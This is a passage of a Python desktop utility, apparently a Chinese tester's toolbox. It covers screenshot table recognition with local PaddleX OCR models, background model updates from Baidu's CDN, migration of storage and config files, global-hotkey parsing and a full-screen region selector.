#!/usr/bin/env python3
"""
图片工具箱
集成: 图片转PDF / 文件分割 / 文件合并 / 生成指定大小文件
"""

import os
import sys
import json

# Windows 平台：隐藏子进程的控制台窗口（防止exe启动时闪现cmd窗口）
if sys.platform == 'win32':
    import subprocess as _subprocess
    _original_popen = _subprocess.Popen
    class _HiddenPopen(_original_popen):
        def __init__(self, *args, **kwargs):
            if 'startupinfo' not in kwargs:
                kwargs['startupinfo'] = _subprocess.STARTUPINFO()
                kwargs['startupinfo'].dwFlags |= _subprocess.STARTF_USESHOWWINDOW
                kwargs['startupinfo'].wShowWindow = _subprocess.SW_HIDE
            super().__init__(*args, **kwargs)
    _subprocess.Popen = _HiddenPopen

# ==================== paddlex 本地离线模型配置 ====================
# 必须在 import paddlex 之前设置：
# 1. 模型缓存目录按优先级选择：
#    a) <存储位置>\models —— 启动时自动检查更新下载的模型（优先）
#       存储位置默认 exe 所在目录，可在界面更改（含迁移）；旧版默认
#       %LOCALAPPDATA%\TestToolbox 的数据首次启动时自动迁移
#    b) 内置模型 —— 源码运行=项目 models/，exe 运行=打包进 exe 的 models/（--add-data）
#    模型已预下载，运行时直接使用本地缓存，不联网
# 2. 模型源固定为 BOS（百度 CDN，国内可达），仅在缓存缺模型时才会联网下载兜底
# 3. 跳过各模型源连通性检查（huggingface/aistudio 不可达时会长时间卡死）
if getattr(sys, 'frozen', False):
    _APP_DIR = os.path.dirname(sys.executable)
    _BUILTIN_MODELS_DIR = os.path.join(sys._MEIPASS, "models")
else:
    _APP_DIR = os.path.dirname(os.path.abspath(__file__))
    _BUILTIN_MODELS_DIR = os.path.join(_APP_DIR, "models")
# 存储根目录：模型/日志/配置文件的存放位置（默认 exe 所在目录，便携式、
# 文件跟程序走；用户可在界面"文件存储位置"中更改，配置持久化在程序同级
# .storage_dir，更改后自动迁移已有文件并立即生效）
_STORAGE_CONFIG_FILE = os.path.join(_APP_DIR, ".storage_dir")
# 旧版本的默认存储位置：首次启动新版本时把其中的数据一次性迁移到
# 当前存储位置（仅 exe 运行且用户未自定义存储位置时）
_LEGACY_STORAGE_DIR = os.path.join(os.environ.get('LOCALAPPDATA', _APP_DIR), "TestToolbox")


def _default_storage_dir():
    return os.path.join(_APP_DIR, "cache")


def _load_storage_dir():
    try:
        with open(_STORAGE_CONFIG_FILE, encoding="utf-8") as f:
            p = f.read().strip()
        if p and os.path.isabs(p):
            return p
    except Exception:
        pass
    return _default_storage_dir()


_STORAGE_DIR = _load_storage_dir()
_EXTERNAL_MODELS_DIR = os.path.join(_STORAGE_DIR, "models")


def _config_path(name):
    """配置文件路径：统一放在存储位置（.storage_dir 本身除外，
    它决定存储位置在哪，必须保存在程序同级）"""
    return os.path.join(_STORAGE_DIR, name)


def _read_config(name):
    """读取配置文件；兼容旧位置（exe 同级 / 旧默认存储位置）：
    读到旧文件则迁移到当前存储位置并删除旧文件"""
    new_p = _config_path(name)
    old_p = os.path.join(_APP_DIR, name)
    legacy_p = os.path.join(_LEGACY_STORAGE_DIR, name)
    try:
        with open(new_p, encoding="utf-8") as f:
            return f.read().strip()
    except Exception:
        pass
    for src_p in (old_p, legacy_p):
        # legacy 位置仅在用户未自定义存储位置时迁移，避免动用户自定义后的数据
        if src_p is legacy_p and os.path.exists(_STORAGE_CONFIG_FILE):
            continue
        try:
            with open(src_p, encoding="utf-8") as f:
                content = f.read().strip()
            if content:
                # 迁移到新位置后删除旧文件，保持旧位置干净
                os.makedirs(_STORAGE_DIR, exist_ok=True)
                with open(new_p, "w", encoding="utf-8") as f:
                    f.write(content)
            os.remove(src_p)
            return content
        except Exception:
            pass
    return None


def _write_config(name, content):
    """写配置文件到存储位置（失败静默，不影响功能）"""
    try:
        os.makedirs(_STORAGE_DIR, exist_ok=True)
        with open(_config_path(name), "w", encoding="utf-8") as f:
            f.write(content)
    except Exception:
        pass


def _external_models_dir():
    """当前外部模型目录（跟随存储位置设置，迁移完成后实时生效）"""
    return os.path.join(_STORAGE_DIR, "models")

# 表格识别流水线所需的全部官方模型名
# 截图场景瘦身：
# 1. 截图无旋转/弯曲、用户已框选表格区域，不加载 doc_ori/UVDoc/PP-DocLayout-L
# 2. OCR 用 mobile 版（server 版为精度设计，CPU 单次推理 ~90 秒；
#    mobile 版实测同一截图 4 秒且识别结果一致，截图为数字原生图像精度足够）
# 3. PP-OCRv5：官方称整体精度较 v4 提升（标点/生僻字/繁体），
#    实测速度与 v4 mobile 相同（~4 秒）
_TABLE_MODEL_NAMES = [
    "SLANet_plus",
    "PP-OCRv5_mobile_det",
    "PP-OCRv5_mobile_rec",
]
_BOS_MODEL_BASE = ("https://paddle-model-ecology.bj.bcebos.com/paddlex/"
                   "official_inference_model/paddle3.0.0")

# 界面可切换的 OCR 引擎选项（表格结构模型 SLANet_plus 固定不变，仅切换 det/rec）。
# builtin=True 的随 exe 内置离线可用；其余按需联网下载到外部目录（一次下载永久保存）。
# size_mb 为 det+rec 两个 tar 包的合计下载体积（BOS Content-Length 实测）。
_OCR_MODEL_OPTIONS = {
    "PP-OCRv5 mobile（推荐·快速）": {
        "det": "PP-OCRv5_mobile_det", "rec": "PP-OCRv5_mobile_rec",
        "builtin": True, "size_mb": 22,
        "desc": ("优点：速度快（约4秒/图）、体积小、随程序内置离线可用。"
                 "缺点：极模糊或低分辨率图片的精度低于 server 版。"
                 "适用场景：清晰的屏幕截图（默认推荐）。"),
    },
    "PP-OCRv5 server（高精度·慢）": {
        "det": "PP-OCRv5_server_det", "rec": "PP-OCRv5_server_rec",
        "builtin": False, "size_mb": 173,
        "desc": ("优点：PaddleOCR 精度最高的版本，标点、生僻字、繁体、复杂版式表现最好。"
                 "缺点：CPU 推理约1-3分钟/图，首次使用需联网下载约173MB。"
                 "适用场景：mobile 版识别不准（小字/模糊）或对准确率要求高于速度时。"),
    },
    "PP-OCRv4 mobile（旧版·快速）": {
        "det": "PP-OCRv4_mobile_det", "rec": "PP-OCRv4_mobile_rec",
        "builtin": False, "size_mb": 16,
        "desc": ("优点：速度与 v5 mobile 相当、体积最小（下载约16MB）。"
                 "缺点：精度低于 v5 mobile，无明显优势。"
                 "适用场景：仅作对比回退（v5 识别结果异常时用来验证）。"),
    },
    "PP-OCRv4 server（旧版·高精度）": {
        "det": "PP-OCRv4_server_det", "rec": "PP-OCRv4_server_rec_doc",
        "builtin": False, "size_mb": 304,
        "desc": ("优点：针对文档长文本优化（rec_doc），久经验证稳定。"
                 "缺点：推理慢（约1-3分钟/图），精度低于 v5 server，下载约304MB。"
                 "适用场景：仅作旧版对比。"),
    },
}
_OCR_MODEL_DEFAULT = "PP-OCRv5 mobile（推荐·快速）"
# 全部已知模型名（含可选项）：清理外部模型目录时仅删除不在该集合内的遗留目录
_ALL_KNOWN_MODELS = set(_TABLE_MODEL_NAMES) | {
    opt[k] for opt in _OCR_MODEL_OPTIONS.values() for k in ("det", "rec")}

# 当前生效的 OCR 模型选择（界面切换，立即生效；配置存放在存储位置）
_OCR_MODEL_CONFIG_NAME = ".ocr_model"


def _load_ocr_model_choice():
    """读取持久化的模型选择，非法值回退默认"""
    label = _read_config(_OCR_MODEL_CONFIG_NAME)
    if label in _OCR_MODEL_OPTIONS:
        return label
    return _OCR_MODEL_DEFAULT


def _save_ocr_model_choice(label):
    """持久化模型选择（失败静默，不影响切换）"""
    _write_config(_OCR_MODEL_CONFIG_NAME, label)


_OCR_MODEL_CHOICE = _load_ocr_model_choice()


def _ocr_model_dir(name):
    """模型文件所在目录：优先当前模型源（内置或已更新的外部目录），其次外部目录。
    可选模型（server 等）只存在于外部目录。找不到返回 None。
    完整性校验（目录含 inference.yml）：下载中断会留下半成品目录，
    若只判 isdir 会误判"已就绪"，随后流水线加载报晦涩错误。"""
    for root in (_MODELS_DIR, _external_models_dir()):
        d = os.path.join(root, "official_models", name)
        if os.path.isfile(os.path.join(d, "inference.yml")):
            return d
    return None



def _load_models_manifest(models_dir):
    """读取模型目录下的 manifest.json（记录 {模型名: etag}），失败返回 None"""
    try:
        with open(os.path.join(models_dir, "manifest.json"), encoding="utf-8") as f:
            m = json.load(f)
        if isinstance(m, dict):
            return m
    except Exception:
        pass
    return None


def _models_dir_complete(models_dir):
    """模型目录是否完整：manifest 记录了全部所需模型且对应目录都存在"""
    manifest = _load_models_manifest(models_dir)
    if manifest is None:
        return False
    official = os.path.join(models_dir, "official_models")
    return all(name in manifest and os.path.isdir(os.path.join(official, name))
               for name in _TABLE_MODEL_NAMES)


_MODELS_DIR = (_EXTERNAL_MODELS_DIR if _models_dir_complete(_EXTERNAL_MODELS_DIR)
               else _BUILTIN_MODELS_DIR)
os.environ['PADDLE_PDX_CACHE_HOME'] = _MODELS_DIR
os.environ['PADDLE_PDX_MODEL_SOURCE'] = 'bos'
os.environ['PADDLE_PDX_DISABLE_MODEL_SOURCE_CHECK'] = '1'
os.environ['PADDLE_PDX_ENABLE_MKLDNN_BYDEFAULT'] = '0'

# 性能优化：paddlex/cv2/PIL 是重依赖（加载需数秒），改为延迟导入。
# 界面相关代码只依赖 tkinter（轻量），窗口可立即显示；
# OCR/截图等用到重依赖的入口先调用 _load_heavy_modules()。

_HEAVY_LOADED = False

def _load_heavy_modules():
    """按需加载重依赖（cv2/PIL/paddlex 补丁）。首次调用有数秒开销，之后直接返回。"""
    global _HEAVY_LOADED, Image, ImageTk, ImageGrab, cv2
    if _HEAVY_LOADED:
        return
    # 补丁1：paddlex 部分模块在导入时用 importlib.metadata 检查 "opencv-contrib-python"，
    # 实际安装的是 opencv-python（同为 cv2），让该检查通过，否则 image_reader 等模块不会 import cv2
    import importlib.metadata as _imd
    import cv2 as _cv2
    _orig_imd_version = _imd.version
    def _patched_imd_version(name):
        if name == "opencv-contrib-python":
            return _cv2.__version__
        return _orig_imd_version(name)
    _imd.version = _patched_imd_version

    # 补丁2：绕过 paddlex 在 PyInstaller exe 中的依赖检查
    import paddlex.utils.deps as _pdx_deps
    _pdx_deps.is_extra_available = lambda extra: True
    _pdx_deps.is_dep_available = lambda dep, check_version=False: True

    from PIL import Image as _Image, ImageGrab as _ImageGrab, ImageTk as _ImageTk
    import cv2 as _cv2_real
    Image, ImageGrab, ImageTk, cv2 = _Image, _ImageGrab, _ImageTk, _cv2_real
    _HEAVY_LOADED = True

import re
import logging
import threading
import traceback
import contextlib
import tkinter as tk
from tkinter import ttk, filedialog, messagebox

# paddlex 内部日志走 logging（stderr/INFO 级别），配置后才能在日志面板可见
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s')

from image_to_pdf import merge_images_to_pdf, convert_images_to_zip
from file_splitter import split_to_zip, merge_zip_files
from generate_file import create_file, CORRUPT_METHODS, TYPE_CORRUPT_METHODS
from generate_text import generate_text, TEXT_TYPES
from generate_person import generate_person, generate_id_card, generate_name, generate_phone
from url_codec import url_encode, url_decode
from http_client import send_request, parse_headers, format_response
from json_fmt import json_format, json_compact, json_sort, json_diff_spans


# ==================== 截图表格识别模块 ====================

# 流水线全局缓存：模型加载非常耗时，只加载一次供后续复用。
# 单槽缓存：切换模型后按新选择重建（旧实例若正被识别任务使用则安全等待其结束，
# 因为调用方持有引用；全局槽位被替换不影响进行中的推理）
_TABLE_PIPELINE = None
_TABLE_PIPELINE_KEY = None  # 已加载流水线对应的 (det, rec) 组合
_TABLE_PIPELINE_LOCK = threading.Lock()


def _get_table_pipeline():
    _load_heavy_modules()
    """获取表格识别流水线（懒加载 + 线程安全；按当前所选 OCR 模型构建）"""
    global _TABLE_PIPELINE, _TABLE_PIPELINE_KEY
    opt = _OCR_MODEL_OPTIONS[_OCR_MODEL_CHOICE]
    key = (opt["det"], opt["rec"])
    if _TABLE_PIPELINE is not None and _TABLE_PIPELINE_KEY == key:
        return _TABLE_PIPELINE
    # 锁被占用说明预热线程正在加载：给出提示再等待，避免静默阻塞
    if not _TABLE_PIPELINE_LOCK.acquire(blocking=False):
        print("[模型] 正在等待后台模型加载完成（mobile 模型数秒、server 模型约1-3分钟），请稍候...")
        _TABLE_PIPELINE_LOCK.acquire()
    try:
        if _TABLE_PIPELINE is None or _TABLE_PIPELINE_KEY != key:
            from paddlex import create_pipeline
            print(f"正在加载识别模型（仅首次）: {_OCR_MODEL_CHOICE} ...")
            # 详细过程日志，便于排查模型缺失/加载失败等问题
            models_root = os.path.join(_MODELS_DIR, "official_models")
            if os.path.isdir(models_root):
                cached = [d for d in os.listdir(models_root)
                          if os.path.isdir(os.path.join(models_root, d))]
                print(f"[模型] 缓存目录: {models_root}")
                print(f"[模型] 已缓存模型: {', '.join(cached) if cached else '无'}")
            else:
                print(f"[模型] 缓存目录不存在: {models_root}（将尝试联网下载，请检查网络）")
            print(f"[模型] 模型源: {os.environ.get('PADDLE_PDX_MODEL_SOURCE')}，"
                  f"联网检查: {'跳过' if os.environ.get('PADDLE_PDX_DISABLE_MODEL_SOURCE_CHECK') else '开启'}")
            # 解析所选模型的本地目录（内置模型在 _MODELS_DIR，可选模型在外部目录）
            model_dirs = {}
            missing = []
            for kind in ("det", "rec"):
                d = _ocr_model_dir(opt[kind])
                if d is None:
                    missing.append(opt[kind])
                else:
                    model_dirs[kind] = d
            if missing:
                raise RuntimeError(
                    f"所选模型尚未就绪: {', '.join(missing)}"
                    "（正在下载或下载失败，可在\"识别模型\"下拉框中重新选择）")
            try:
                # 截图场景精简流水线：
                # 1. 关闭文档预处理（方向/弯曲矫正）与版面检测子模型
                #    ——三者根本不加载（而非仅跳过推理）
                # 2. OCR 子模型按界面选择加载（默认 v5 mobile：4 秒/图；
                #    可切换 server 高精度版，代价是 CPU 推理 1-3 分钟/图）
                # 3. model_dir 显式指定本地路径：可选模型在外部目录，
                #    不依赖 PADDLE_PDX_CACHE_HOME（exe 下可能指向临时解压目录）
                from paddlex.inference.pipelines import load_pipeline_config
                _slim_cfg = load_pipeline_config('table_recognition')
                _slim_cfg['use_doc_preprocessor'] = False
                _slim_cfg['use_layout_detection'] = False
                _ocr_sub = _slim_cfg['SubPipelines']['GeneralOCR']['SubModules']
                _ocr_sub['TextDetection'].update(
                    model_name=opt["det"], model_dir=model_dirs["det"])
                _ocr_sub['TextRecognition'].update(
                    model_name=opt["rec"], model_dir=model_dirs["rec"])
                print("[模型] 使用精简流水线（跳过方向矫正/去畸变/版面检测，"
                      f"OCR: {opt['det']} + {opt['rec']}）")
                _TABLE_PIPELINE = create_pipeline(
                    pipeline='table_recognition', config=_slim_cfg)
                _TABLE_PIPELINE_KEY = key
            except Exception:
                print("[模型] 加载失败，完整堆栈如下：")
                print(traceback.format_exc())
                raise
            print("模型加载完成")
    finally:
        _TABLE_PIPELINE_LOCK.release()
    return _TABLE_PIPELINE


def _prewarm_pipeline_worker():
    """后台加载当前所选模型（启动预热/切换模型后调用，加快首次识别）"""
    try:
        _get_table_pipeline()
    except Exception:
        logging.error(f"[模型预热] 加载失败:\n{traceback.format_exc()}")


# ==================== 模型自动更新检查 ====================

def _model_remote_tags(timeout=5):
    """向 BOS 逐个 HEAD 请求，返回 {模型名: etag}；网络不可达返回 None"""
    import requests
    tags = {}
    for name in _TABLE_MODEL_NAMES:
        url = f"{_BOS_MODEL_BASE}/{name}_infer.tar"
        try:
            r = requests.head(url, timeout=timeout)
            if r.status_code != 200:
                logging.warning(f"[模型更新] {name} HEAD 状态码 {r.status_code}")
                return None
            tag = r.headers.get("ETag") or r.headers.get("Last-Modified")
            if not tag:
                logging.warning(f"[模型更新] {name} 响应缺少 ETag/Last-Modified 头")
                return None
            tags[name] = tag
        except Exception as e:
            logging.warning(f"[模型更新] {name} 检查失败: {e}")
            return None
    return tags


def _download_model(name, models_dir):
    """下载并解压单个模型到 models_dir/official_models/{name}"""
    import tarfile
    import urllib.request
    url = f"{_BOS_MODEL_BASE}/{name}_infer.tar"
    official_dir = os.path.join(models_dir, "official_models")
    tar_path = os.path.join(models_dir, f"{name}_infer.tar")

    logging.info(f"[模型更新] 下载 {url}")

    os.makedirs(models_dir, exist_ok=True)
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=300) as resp:
        with open(tar_path, "wb") as f:
            while True:
                chunk = resp.read(8192)
                if not chunk:
                    break
                f.write(chunk)

    os.makedirs(official_dir, exist_ok=True)
    with tarfile.open(tar_path, "r:*") as tar:
        tar.extractall(official_dir)
    os.remove(tar_path)
    logging.info(f"[模型更新] {name} 下载并解压完成")


def _save_models_manifest(models_dir, manifest):
    """原子写入 manifest.json"""
    tmp = os.path.join(models_dir, "manifest.json.tmp")
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(manifest, f, ensure_ascii=False, indent=2)
    os.replace(tmp, os.path.join(models_dir, "manifest.json"))


_CRASH_LOG_F = None  # 全局引用，防止文件对象被回收导致 faulthandler 失效


def _setup_update_file_log():
    r"""把日志额外写入 <存储位置>\update.log（exe 无控制台，便于排查），
    同时开启 faulthandler：C 层崩溃（access violation 等）的堆栈写 crash.log"""
    global _CRASH_LOG_F
    try:
        d = _STORAGE_DIR
        os.makedirs(d, exist_ok=True)
        h = logging.FileHandler(os.path.join(d, "update.log"), encoding="utf-8")
        h.setFormatter(logging.Formatter(
            '%(asctime)s [%(levelname)s] %(name)s: %(message)s'))
        logging.getLogger().addHandler(h)
    except Exception:
        pass
    try:
        import faulthandler
        _CRASH_LOG_F = open(os.path.join(d, "crash.log"), "a", encoding="utf-8")
        faulthandler.enable(_CRASH_LOG_F, all_threads=True)
    except Exception:
        pass


def _migrate_legacy_storage(log=None):
    r"""一次性把旧默认存储位置的数据迁移到当前存储位置。
    支持两种迁移：
    1. 从 %LOCALAPPDATA%\TestToolbox 迁移到当前存储位置（旧版本）
    2. 从 exe 所在目录迁移到 exe 所在目录/cache（版本升级）
    仅当 exe 运行、用户未自定义存储位置且旧目录存在时执行；
    模型目录合并复制（保留已下载的可选模型），配置/日志移动，完成后删除
    旧目录。失败仅记日志，下次启动重试。"""
    def _log(text):
        logging.info(f"[storage迁移] {text}")
        if log:
            try:
                log(text)
            except Exception:
                pass

    try:
        # dev 运行不迁移：旧数据是 exe 用户产生的，不应混入项目目录
        if not getattr(sys, 'frozen', False):
            return
        # 用户已自定义存储位置：说明已主动迁移过，不动旧目录
        if os.path.exists(_STORAGE_CONFIG_FILE):
            return
        
        import shutil
        
        # 迁移1：从 %LOCALAPPDATA%\TestToolbox 迁移（旧版本兼容）
        if os.path.isdir(_LEGACY_STORAGE_DIR) and os.path.normcase(_LEGACY_STORAGE_DIR) != os.path.normcase(_STORAGE_DIR):
            _log(f"检测到旧版本数据({_LEGACY_STORAGE_DIR})，正在迁移到 {_STORAGE_DIR}...")
            legacy_models = os.path.join(_LEGACY_STORAGE_DIR, "models")
            if os.path.isdir(legacy_models):
                shutil.copytree(legacy_models, _external_models_dir(), dirs_exist_ok=True)
            for fname in (".ocr_model", ".ocr_hotkey", "update.log", "crash.log"):
                src = os.path.join(_LEGACY_STORAGE_DIR, fname)
                if os.path.isfile(src):
                    try:
                        shutil.move(src, os.path.join(_STORAGE_DIR, fname))
                    except Exception:
                        pass
            shutil.rmtree(_LEGACY_STORAGE_DIR, ignore_errors=True)
            _log(f"旧版本数据已迁移到 {_STORAGE_DIR}，旧目录已清理")
        
        # 迁移2：从 exe 所在目录迁移到 cache 子目录（版本升级）
        # 检查 exe 所在目录是否有需要迁移的文件
        _APP_DIR_CACHE = os.path.join(_APP_DIR, "cache")
        if os.path.normcase(_STORAGE_DIR) == os.path.normcase(_APP_DIR_CACHE):
            # 当前存储位置就是 cache，检查旧位置是否有文件需要迁移
            has_files_to_migrate = False
            for fname in ("models", ".ocr_model", ".ocr_hotkey", "update.log", "crash.log"):
                src = os.path.join(_APP_DIR, fname)
                if os.path.exists(src):
                    has_files_to_migrate = True
                    break
            
            if has_files_to_migrate:
                _log(f"检测到旧版本数据在 {_APP_DIR}，正在迁移到 {_STORAGE_DIR}...")
                # 迁移模型目录
                old_models = os.path.join(_APP_DIR, "models")
                if os.path.isdir(old_models):
                    shutil.copytree(old_models, _external_models_dir(), dirs_exist_ok=True)
                    shutil.rmtree(old_models, ignore_errors=True)
                # 迁移配置和日志文件
                for fname in (".ocr_model", ".ocr_hotkey", "update.log", "crash.log"):
                    src = os.path.join(_APP_DIR, fname)
                    if os.path.isfile(src):
                        try:
                            dst = os.path.join(_STORAGE_DIR, fname)
                            shutil.move(src, dst)
                        except Exception:
                            pass
                _log(f"旧版本数据已迁移到 {_STORAGE_DIR}")
    except Exception as e:
        logging.error(f"[storage迁移] 失败: {e}\n{traceback.format_exc()}")


def _check_model_updates_worker(app):
    """后台线程：检查模型更新，有新版本则下载到外部目录（下次启动生效）"""
    import shutil
    import time

    def notify(text):
        # 过程始终写 logging（exe 下落到 update.log 文件，便于排查）
        logging.info(f"[模型更新] {text}")
        try:
            app.after(0, lambda t=text: app._notify_global(t))
        except Exception:
            # mainloop 未就绪或窗口已关闭时 after 会失败（RuntimeError/TclError），
            # UI 提示丢失但更新流程继续，日志中仍有完整记录
            pass

    time.sleep(3)  # 等待 GUI 主循环就绪，使 after 通知可用

    # 一次性迁移旧默认存储位置（%LOCALAPPDATA%\TestToolbox）的数据到当前存储位置
    _migrate_legacy_storage(notify)

    # 清理外部目录中旧版本遗留的已弃用模型（如 doc_ori/UVDoc/DocLayout），释放磁盘。
    # 注意用 _ALL_KNOWN_MODELS 判断：用户按需下载的可选 OCR 模型（server 等）允许保留
    ext_dir = _external_models_dir()
    ext_official = os.path.join(ext_dir, "official_models")
    if os.path.isdir(ext_official):
        for d in os.listdir(ext_official):
            if d not in _ALL_KNOWN_MODELS and os.path.isdir(os.path.join(ext_official, d)):
                shutil.rmtree(os.path.join(ext_official, d), ignore_errors=True)
                notify(f"已清理不再使用的模型: {d}")
        ext_manifest = _load_models_manifest(ext_dir)
        if ext_manifest:
            pruned = {k: v for k, v in ext_manifest.items() if k in _TABLE_MODEL_NAMES}
            if pruned != ext_manifest:
                _save_models_manifest(ext_dir, pruned)

    notify("正在检查表格识别模型更新...")
    remote = _model_remote_tags()
    if remote is None:
        notify("模型更新检查失败（网络不可达），使用本地模型")
        return

    # 版本基线 = 内置模型打包时的 manifest（models/manifest.json），外部已更新的记录优先
    builtin = _load_models_manifest(_BUILTIN_MODELS_DIR) or {}
    local = {**builtin, **(_load_models_manifest(ext_dir) or {})}
    changed = [n for n in _TABLE_MODEL_NAMES if local.get(n) != remote[n]]
    if not changed:
        notify("表格识别模型已是最新版本")
        return

    notify(f"发现 {len(changed)} 个模型有更新，开始下载...")
    official_dir = os.path.join(ext_dir, "official_models")
    os.makedirs(official_dir, exist_ok=True)
    # 外部目录尚未成为完整副本时，先以内置模型为底座复制一份（保证目录完整可独立使用）
    if not _models_dir_complete(ext_dir):
        builtin_official = os.path.join(_BUILTIN_MODELS_DIR, "official_models")
        if os.path.isdir(builtin_official):
            notify("正在准备外部模型目录（首次更新，复制内置模型）...")
            shutil.copytree(builtin_official, official_dir, dirs_exist_ok=True)
    manifest = {n: local[n] for n in _TABLE_MODEL_NAMES if n in local}
    ok, failed = [], []
    for name in changed:
        try:
            _download_model(name, ext_dir)
            manifest[name] = remote[name]
            _save_models_manifest(ext_dir, manifest)
            ok.append(name)
            notify(f"模型 {name} 更新完成（{len(ok)}/{len(changed)}）")
        except Exception as e:
            failed.append(name)
            # 删除半成品目录，避免下次被误认为有效缓存
            bad = os.path.join(official_dir, name)
            shutil.rmtree(bad, ignore_errors=True)
            logging.warning(f"[模型更新] {name} 下载失败: {e}\n{traceback.format_exc()}")
            notify(f"模型 {name} 下载失败（{e}），继续使用本地模型")
    if ok and not failed:
        notify("模型更新完成，重启后生效")


# ==================== 全局快捷键解析 ====================

# 修饰键别名 -> pynput 键名（<> 包裹）
_HOTKEY_MODIFIER_ALIASES = {
    "ctrl": "ctrl", "control": "ctrl", "ctl": "ctrl",
    "shift": "shift", "alt": "alt", "altgr": "alt_gr",
}
# 支持的主键名（<> 包裹；单字符字母/数字无需包裹）
_HOTKEY_SPECIAL_KEYS = {
    "space", "tab", "enter", "return", "esc", "escape", "backspace",
    "delete", "del", "insert", "home", "end", "page_up", "page_down",
    "up", "down", "left", "right",
}


def _parse_hotkey(hotkey_str):
    """解析快捷键字符串。
    返回 (pynput组合, 规范化显示文本)，非法输入返回 (None, 错误原因)。
    注意 pynput 格式要求：修饰键/功能键用 <> 包裹（<ctrl>、<f5>），
    单字符主键不能包裹（t、7）——包裹会导致解析失败、监听器无法启动。
    """
    parts = [p.strip() for p in hotkey_str.split("+") if p.strip()]
    if len(parts) < 2:
        return None, "格式应为一个修饰键(Ctrl/Shift/Alt)加一个按键，如 Ctrl+Shift+T"
    mods, key = [], None
    for p in parts:
        low = p.lower()
        if low in _HOTKEY_MODIFIER_ALIASES:
            m = _HOTKEY_MODIFIER_ALIASES[low]
            if m not in mods:
                mods.append(m)
        elif key is None:
            key = low
        else:
            return None, f"主键只能有一个（多余的: {p}）"
    if key is None:
        return None, "缺少主键（如 Ctrl+Shift+T 中的 T）"
    if not mods:
        return None, "缺少修饰键（Ctrl/Shift/Alt 至少一个）"
    if len(mods) + 1 > 3:
        return None, "组合键过多（硬件最多同时识别 3 键）"
    if len(key) == 1 and key.isalnum():
        pass  # 单字符字母/数字：不包裹
    elif re.fullmatch(r"f([1-9]|1[0-2])", key) or key in _HOTKEY_SPECIAL_KEYS:
        key = f"<{key}>"  # 功能键/特殊键：包裹
    else:
        return None, f"无法识别的按键: {key}"
    combo = "+".join(f"<{m}>" for m in mods) + f"+{key}"
    raw_key = key.strip("<>")
    key_disp = raw_key.upper() if len(raw_key) == 1 else raw_key.capitalize()
    display = "+".join(m.capitalize() for m in mods) + "+" + key_disp
    return (combo, display), None


class ConfirmToolbar(tk.Toplevel):
    """框选完成后浮动的确认工具条：√ 确认识别 / X 取消"""

    def __init__(self, parent, x, y, on_confirm, on_cancel):
        super().__init__(parent)
        self.overrideredirect(True)
        self.attributes("-topmost", True)
        self.configure(bg="#1e6fd9")

        btn_ok = tk.Label(self, text="✔", font=("Segoe UI Symbol", 15, "bold"),
                          fg="white", bg="#1e6fd9", width=3, cursor="hand2")
        btn_ok.pack(side="left", padx=(2, 0), pady=3)
        btn_cancel = tk.Label(self, text="✘", font=("Segoe UI Symbol", 15, "bold"),
                              fg="white", bg="#1e6fd9", width=3, cursor="hand2")
        btn_cancel.pack(side="left", padx=(0, 2), pady=3)

        btn_ok.bind("<Button-1>", lambda e: on_confirm())
        btn_cancel.bind("<Button-1>", lambda e: on_cancel())
        # 悬停高亮
        btn_ok.bind("<Enter>", lambda e: btn_ok.config(bg="#36d399"))
        btn_ok.bind("<Leave>", lambda e: btn_ok.config(bg="#1e6fd9"))
        btn_cancel.bind("<Enter>", lambda e: btn_cancel.config(bg="#f87272"))
        btn_cancel.bind("<Leave>", lambda e: btn_cancel.config(bg="#1e6fd9"))

        self.update_idletasks()
        w, h = self.winfo_reqwidth(), self.winfo_reqheight()
        # 工具条显示在选区右下角，越界时自动收回屏幕内
        sw = parent.winfo_screenwidth()
        sh = parent.winfo_screenheight()
        px = min(max(0, x), sw - w)
        py = min(max(0, y), sh - h)
        self.geometry(f"+{px}+{py}")
        self.lift()

    def dismiss(self):
        try:
            self.destroy()
        except Exception:
            pass


class RegionSelector(tk.Toplevel):
    """全屏截图选择器：打开即整屏暗色（预合成暗色底图），选区内保持明亮；
    松开鼠标后可拖动 8 个手柄调整选区、拖动选区内部移动选区，再确认或取消"""

    _MIN_SIZE = 10        # 选区最小尺寸（像素）
    _HANDLE_R = 6         # 手柄命中半径（像素）

    def __init__(self, parent=None, callback=None):
        super().__init__(parent)
        self.callback = callback
        self.start_x = 0
        self.start_y = 0
        self._hint_id = None
        self._result_image = None
        self._toolbar = None
        self._sel_coords = None   # 当前选区 (x1, y1, x2, y2)，None=无选区
        self._mode = None         # 按下后的操作: 'new' | 'move' | 'resize' | None
        self._handle = None       # resize 时命中的手柄名
        self._press_x = self._press_y = 0   # move/resize 按下位置
        self._orig_sel = None     # move/resize 按下时的选区快照
        self._render_pending = False

        self._overlay_ids = []
        self._screen_img = None   # 亮色截图（视图坐标）
        self._dark_img = None     # 半暗截图（视图坐标，作为底图）
        self._orig_img = None     # 原始物理像素截图
        self._scale_x = 1.0       # 物理像素 / 逻辑坐标（DPI 缩放修正）
        self._scale_y = 1.0

        # 全屏无边框窗口
        self.attributes("-fullscreen", True)
        self.attributes("-topmost", True)

        self.canvas = tk.Canvas(self, cursor="cross", bg="#111111",
                                highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)

        # 提示文字（先显示加载提示；窗口底色本身即深色，打开即暗）
        hint_id = self.canvas.create_text(
            self.winfo_screenwidth() // 2,
            30,
            text="拖动鼠标框选表格区域 | 松开后可拖动边角手柄调整、拖动内部移动 | ✔ 识别 / ✘ 取消 / ESC 取消",
            fill="white",
            font=("Microsoft YaHei UI", 14, "bold"),
        )
        self._hint_id = hint_id
        # 先让窗口显示出来，再异步抓取屏幕，避免打开截图时界面卡顿无响应
        self.after(30, self._prepare_background)

    def _prepare_background(self):
        _load_heavy_modules()
        """窗口显示后抓取整屏并铺暗色底图（含 DPI 缩放比例记录）"""
        try:
            vw, vh = max(1, self.winfo_vrootwidth()), max(1, self.winfo_vrootheight())
            # 抓屏期间隐藏自身，避免把遮罩窗口本身拍进截图
            self.withdraw()
            self.update()
            orig = ImageGrab.grab(all_screens=True)
            self.deiconify()
            self.lift()
            sw, sh = orig.size
            self._scale_x = sw / vw
            self._scale_y = sh / vh
            if (sw, sh) != (vw, vh):
                shot = orig.resize((vw, vh))
            else:
                shot = orig
            self._orig_img = orig      # 保留原始物理像素截图用于裁剪
            self._screen_img = shot
